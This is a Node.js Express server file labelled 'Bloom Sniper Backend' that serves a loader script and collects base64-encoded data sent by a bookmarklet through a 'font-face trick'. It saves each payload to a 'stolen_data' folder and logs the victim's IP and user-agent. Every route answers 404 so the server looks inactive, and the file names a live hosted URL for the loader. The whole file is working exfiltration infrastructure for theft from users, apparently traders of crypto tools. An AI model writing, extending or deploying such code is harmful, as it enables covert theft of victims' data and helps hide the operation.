const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

console.log('===========================================');
console.log('🚀 Bloom Sniper Backend Starting...');
console.log('===========================================');

// Serve loader.js
const loaderPath = path.join(__dirname, 'public/axiom');
app.use('/axiom', express.static(loaderPath));
console.log(`📁 Static files served from: ${loaderPath}`);
console.log(`✅ Loader.js available at: /axiom/loader.js`);

// Root route
app.get('/', (req, res) => {
    console.log(`🌐 Root route accessed from IP: ${req.ip}`);
    res.status(404).send('Not Found');
});

// Direct /i route
app.get('/i', (req, res) => {
    console.log(`📥 /i route accessed (no data)`);
    res.status(404).json({ detail: "Not Found" });
});

// Main data receiving route (font-face trick)
app.get('/i/:data', (req, res) => {
    const encoded = req.params.data;
    const fullUrl = req.originalUrl;

    console.log('───────────────────────────────────────────');
    console.log(`📥 DATA ENDPOINT HIT`);
    console.log(`   Full URL: ${fullUrl}`);
    console.log(`   Data length: ${encoded.length} characters`);
    console.log(`   From IP: ${req.ip}`);
    console.log(`   User-Agent: ${req.get('User-Agent') || 'Unknown'}`);

    let payload = {};

    try {
        const jsonString = Buffer.from(encoded, 'base64').toString('utf-8');
        payload = JSON.parse(jsonString);

        console.log('✅ DATA DECODED SUCCESSFULLY');
        console.log('📦 Payload:', JSON.stringify(payload, null, 2));

        // Save to file
        const logDir = path.join(__dirname, 'stolen_data');
        if (!fs.existsSync(logDir)) {
            fs.mkdirSync(logDir, { recursive: true });
            console.log(`📁 Created stolen_data folder`);
        }

        const filename = `stolen_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
        const filePath = path.join(logDir, filename);

        fs.writeFileSync(filePath, JSON.stringify(payload, null, 2));

        console.log(`💾 SAVED TO FILE: ${filename}`);
        console.log(`   Location: stolen_data/${filename}`);
        console.log('───────────────────────────────────────────');

    } catch (e) {
        console.error('❌ FAILED TO DECODE PAYLOAD');
        console.error('   Error:', e.message);
        console.error('   Raw data (first 100 chars):', encoded.substring(0, 100) + '...');
    }

    // Always return 404 like the original
    res.status(404).json({ detail: "Not Found" });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log('===========================================');
    console.log(`✅ SERVER IS LIVE ON PORT ${PORT}`);
    console.log(`📍 Loader URL : https://bloom-sniper-backend.onrender.com/axiom/loader.js`);
    console.log(`📥 Data ready at: https://bloom-sniper-backend.onrender.com/i/...`);
    console.log('===========================================');
    console.log('Waiting for bookmarklet data...');
});